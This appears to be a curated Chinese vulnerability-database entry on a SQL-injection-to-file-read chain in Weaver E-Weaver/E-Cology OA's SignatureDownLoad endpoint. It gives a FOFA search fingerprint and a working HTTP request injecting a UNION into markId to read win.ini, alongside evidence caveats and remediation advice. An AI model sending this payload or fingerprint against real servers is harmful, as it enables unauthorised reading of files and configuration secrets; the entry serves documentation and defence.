---
source: "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/90103c248a2c52bb0a060d0ee95d5a67e4579c3d/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
title: "泛微E-Weaver/E-Cology（来源不一） SignatureDownLoad SQL控制→文件读取链"
product: "泛微E-Weaver/E-Cology（来源不一）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "产品归属/数据库/版本/补丁未知；Windows示例"
prerequisites: "未明确实际认证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-协同办公OA\""
id: "vw-78295d80286d179bd1348434"
entity_id: "ve-78295d80286d179bd1348434"
schema_version: "1"
source_url: "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/90103c248a2c52bb0a060d0ee95d5a67e4579c3d/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
---

# 泛微E-Weaver/E-Cology（来源不一） SignatureDownLoad SQL控制→文件读取链

## 条目说明

- 对象与具体问题：泛微E-Weaver/E-Cology（来源不一）；SignatureDownLoad SQL控制→文件读取链
- 版本、配置及部署条件：产品归属/数据库/版本/补丁未知；Windows示例
- 认证与权限前提：未明确实际认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 明确SQL UNION给出路径再下载的复合机制，不与普通路径穿越混同
- 产品命名分歧已坦诚记录；Windows/权限/响应证据边界详细
- 应有SQL注入+文件读取双分类，保留多源差异而不猜产品

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

公开资料记录泛微 `weaver.file.SignatureDownLoad` 的文件读取问题：`markId` 中的 UNION 查询返回文件路径，接口再以下载方式返回该文件内容。该链路结合了 SQL 输入控制和文件路径使用。

### 影响范围与前提

公开资料对产品名称有 E-Weaver/E-Cology 两种标注，均定位到同一个 `weaver.file.SignatureDownLoad` 入口。精确受影响版本、数据库与修复范围未知；读取权限受服务端账号限制。

### 公开验证资料

公开文本验证请求使用 Windows 自带配置文件：

```http
GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27 HTTP/1.1
Host: oa.example.com
```

确认时应核对响应是否为真实 INI 内容，而非仅命中 `MAPI` 或 `files`。此路径仅适用于对应 Windows 环境。来源还提供读取产品配置文件的完整请求；应以实际目标内容为依据，不能仅凭 `application/octet-stream` 或下载文件名判断。

### 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

### 参考来源

- [公开资料 1](https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/90103c248a2c52bb0a060d0ee95d5a67e4579c3d/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
- [公开资料 2](https://github.com/projectdiscovery/nuclei-templates/blob/8b9d065ccb0492d39f7680c908b3030a97ddfe1b/http/vulnerabilities/weaver/weaver-signaturedownload-lfi.yaml)
- [公开资料 3](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/E-Weaver%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.yaml)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
